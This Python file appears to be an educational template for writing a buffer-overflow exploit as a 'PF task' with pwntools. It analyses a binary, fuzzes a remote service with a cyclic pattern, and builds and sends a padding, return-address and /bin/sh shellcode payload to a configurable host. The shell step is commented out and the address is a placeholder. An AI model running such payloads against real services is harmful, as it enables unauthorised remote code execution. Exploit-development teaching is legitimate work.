#!/usr/bin/env python3
"""
PF Task Example: Simple Buffer Overflow Exploit

This demonstrates how to write exploits as PF tasks instead of traditional
MSF modules. This approach gives you direct access to pwntools, radare2,
gdb, and other modern exploitation tools.

Author: Example
License: MSF_LICENSE
"""

import os
import sys
from pwn import context, log, remote, ELF, gdb, asm, shellcraft, p64, cyclic, cyclic_find

# Configure pwntools context
context.update(arch='amd64', os='linux', log_level='info')


class BufferOverflowTask:
    """
    Example PF task for a buffer overflow exploit
    
    This demonstrates:
    - Simple configuration via environment variables
    - Integration with pwntools
    - Multiple operation modes (analyze, fuzz, exploit)
    - Educational comments explaining each step
    """
    
    def __init__(self):
        self.name = "Example Buffer Overflow"
        self.description = "Educational buffer overflow exploit as a PF task"
        
        # Simple configuration - use environment variables instead of MSF's "set" commands
        self.config = {
            'target_host': os.getenv('TARGET_HOST', '127.0.0.1'),
            'target_port': int(os.getenv('TARGET_PORT', '9999')),
            'local_host': os.getenv('LOCAL_HOST', '127.0.0.1'),
            'local_port': int(os.getenv('LOCAL_PORT', '4444')),
            'timeout': int(os.getenv('TIMEOUT', '10')),
        }
        
        log.info(f"Task initialized: {self.name}")
        log.info(f"Target: {self.config['target_host']}:{self.config['target_port']}")
    
    def analyze_binary(self, binary_path):
        """
        Mode 1: Analyze binary to understand the vulnerability
        
        In a real scenario, you would:
        - Use radare2 to analyze the binary
        - Find vulnerable functions
        - Identify gadgets for ROP
        - Check security features (NX, PIE, ASLR, etc.)
        """
        log.info("=== Binary Analysis Mode ===")
        log.info(f"Analyzing: {binary_path}")
        
        if not os.path.exists(binary_path):
            log.error(f"Binary not found: {binary_path}")
            return False
        
        # Load binary with pwntools
        elf = ELF(binary_path)
        
        log.info(f"Architecture: {elf.arch}")
        log.info(f"Entry point: {hex(elf.entry)}")
        log.info(f"Base address: {hex(elf.address)}")
        
        # Check security features
        log.info("Security features:")
        log.info(f"  NX: {elf.nx}")
        log.info(f"  PIE: {elf.pie}")
        log.info(f"  Canary: {elf.canary}")
        log.info(f"  RELRO: {elf.relro}")
        
        # List interesting functions
        log.info("Functions:")
        for func_name in ['main', 'vulnerable', 'win', 'system']:
            if func_name in elf.symbols:
                addr = elf.symbols[func_name]
                log.success(f"  {func_name}: {hex(addr)}")
        
        # Find useful strings
        log.info("Interesting strings:")
        for string in elf.search(b'/bin/sh'):
            log.success(f"  Found '/bin/sh' at {hex(string)}")
        
        return True
    
    def fuzz_offset(self):
        """
        Mode 2: Fuzz to find buffer overflow offset
        
        This uses pwntools' cyclic pattern to determine the exact offset
        where we overwrite the return address.
        """
        log.info("=== Fuzzing Mode ===")
        log.info("Finding buffer overflow offset using cyclic pattern...")
        
        try:
            # Generate cyclic pattern
            pattern = cyclic(1000)
            log.info(f"Generated {len(pattern)} byte cyclic pattern")
            
            # Connect to target
            r = remote(
                self.config['target_host'],
                self.config['target_port'],
                timeout=self.config['timeout']
            )
            
            # Send pattern
            log.info("Sending cyclic pattern...")
            r.send(pattern)
            r.send(b'\n')
            
            # In a real scenario, the program would crash and you'd:
            # 1. Examine the crash with GDB
            # 2. Note the value in RIP/EIP
            # 3. Use cyclic_find() to get the offset
            
            # Example:
            # crashed_value = 0x6161616161616166  # From GDB
            # offset = cyclic_find(crashed_value)
            
            log.info("In a real scenario:")
            log.info("1. The target crashes")
            log.info("2. Attach GDB and find RIP/EIP value")
            log.info("3. Use cyclic_find(value) to get offset")
            log.info("Example: offset = cyclic_find(0x6161616161616166)")
            
            r.close()
            
        except Exception as e:
            log.error(f"Fuzzing failed: {e}")
            return False
        
        return True
    
    def exploit(self, offset=256):
        """
        Mode 3: Run the exploit
        
        This demonstrates a complete exploitation workflow:
        - Connect to target
        - Build exploit buffer with padding, return address, and shellcode
        - Send exploit
        - Get interactive shell
        """
        log.info("=== Exploit Mode ===")
        log.info(f"Exploiting {self.config['target_host']}:{self.config['target_port']}")
        log.info(f"Using offset: {offset}")
        
        try:
            # Connect to target
            r = remote(
                self.config['target_host'],
                self.config['target_port'],
                timeout=self.config['timeout']
            )
            
            log.info("Connected to target")
            
            # Build exploit buffer
            # Structure: [padding][return_address][shellcode]
            
            # 1. Padding to reach return address
            buffer = b'A' * offset
            
            # 2. Return address (would be gadget address or shellcode location)
            # In a real exploit, this would be calculated based on:
            # - Target binary analysis (use ELF class to find gadgets)
            # - Memory layout (may need leak or bruteforce)
            # - ASLR bypass if needed (leak libc address)
            # For demonstration, using a placeholder - replace with actual address from analysis
            ret_addr = 0x00007fffffffe000  # Example stack address - would be from actual analysis
            buffer += p64(ret_addr)  # Pack as 64-bit little-endian
            
            # 3. Shellcode
            # Use pwntools shellcraft to generate shellcode
            shellcode = asm(shellcraft.amd64.linux.sh())
            buffer += shellcode
            
            log.info(f"Exploit buffer size: {len(buffer)} bytes")
            log.info("Buffer structure:")
            log.info(f"  Padding: {offset} bytes")
            log.info(f"  Return address: {hex(ret_addr)}")
            log.info(f"  Shellcode: {len(shellcode)} bytes")
            
            # Send exploit
            log.info("Sending exploit...")
            r.send(buffer)
            r.send(b'\n')
            
            # In a real exploit, we'd get a shell here
            log.success("Exploit sent!")
            log.info("In a real scenario, you would now have a shell")
            log.info("Use r.interactive() to interact with the shell")
            
            # r.interactive()  # Uncomment in real exploit
            
            r.close()
            return True
            
        except Exception as e:
            log.error(f"Exploitation failed: {e}")
            return False
    
    def run_with_gdb(self, binary_path):
        """
        Mode 4: Debug with GDB
        
        This starts the target binary with GDB attached, making it easy
        to debug your exploit as you develop it.
        """
        log.info("=== GDB Debug Mode ===")
        log.info(f"Starting {binary_path} with GDB...")
        
        if not os.path.exists(binary_path):
            log.error(f"Binary not found: {binary_path}")
            return False
        
        # Start process with GDB attached
        # The gdb script sets breakpoints and continues
        io = gdb.debug(binary_path, '''
            # Set Intel syntax for easier reading
            set disassembly-flavor intel
            
            # Break at main
            break main
            
            # Break at vulnerable function if it exists
            # break vulnerable
            
            # Continue execution
            continue
        ''')
        
        # Build and send a test payload
        # Use cyclic pattern to find exact offset during debugging
        test_pattern = cyclic(300)
        log.info(f"Sending cyclic pattern ({len(test_pattern)} bytes)")
        log.info("Use 'cyclic_find(value)' in GDB to find the offset")
        io.send(test_pattern)
        io.send(b'\n')
        
        # Drop to interactive mode
        # You can now interact with GDB and the process
        log.info("Dropping to interactive GDB session...")
        io.interactive()
        
        return True


def main():
    """Main entry point for the PF task"""
    
    import argparse
    
    parser = argparse.ArgumentParser(
        description='PF Task: Example Buffer Overflow Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyze a binary
  python3 pf_task_example.py --mode analyze --binary ./vulnerable
  
  # Fuzz to find offset
  export TARGET_HOST=192.168.1.100
  export TARGET_PORT=9999
  python3 pf_task_example.py --mode fuzz
  
  # Run exploit
  export TARGET_HOST=192.168.1.100
  export TARGET_PORT=9999
  python3 pf_task_example.py --mode exploit --offset 256
  
  # Debug with GDB
  python3 pf_task_example.py --mode debug --binary ./vulnerable

Configuration via environment variables:
  TARGET_HOST - Target host (default: 127.0.0.1)
  TARGET_PORT - Target port (default: 9999)
  LOCAL_HOST  - Local host for reverse shell (default: 127.0.0.1)
  LOCAL_PORT  - Local port for reverse shell (default: 4444)
  TIMEOUT     - Connection timeout in seconds (default: 10)
        """
    )
    
    parser.add_argument(
        '--mode',
        choices=['analyze', 'fuzz', 'exploit', 'debug'],
        default='exploit',
        help='Operation mode (default: exploit)'
    )
    
    parser.add_argument(
        '--binary',
        help='Path to target binary (for analyze/debug modes)'
    )
    
    parser.add_argument(
        '--offset',
        type=int,
        default=256,
        help='Buffer overflow offset (default: 256)'
    )
    
    args = parser.parse_args()
    
    # Create task
    task = BufferOverflowTask()
    
    # Run appropriate mode
    if args.mode == 'analyze':
        if not args.binary:
            log.error("--binary required for analyze mode")
            sys.exit(1)
        success = task.analyze_binary(args.binary)
    
    elif args.mode == 'fuzz':
        success = task.fuzz_offset()
    
    elif args.mode == 'debug':
        if not args.binary:
            log.error("--binary required for debug mode")
            sys.exit(1)
        success = task.run_with_gdb(args.binary)
    
    else:  # exploit
        success = task.exploit(offset=args.offset)
    
    if success:
        log.success("Task completed successfully")
        sys.exit(0)
    else:
        log.error("Task failed")
        sys.exit(1)


if __name__ == '__main__':
    main()
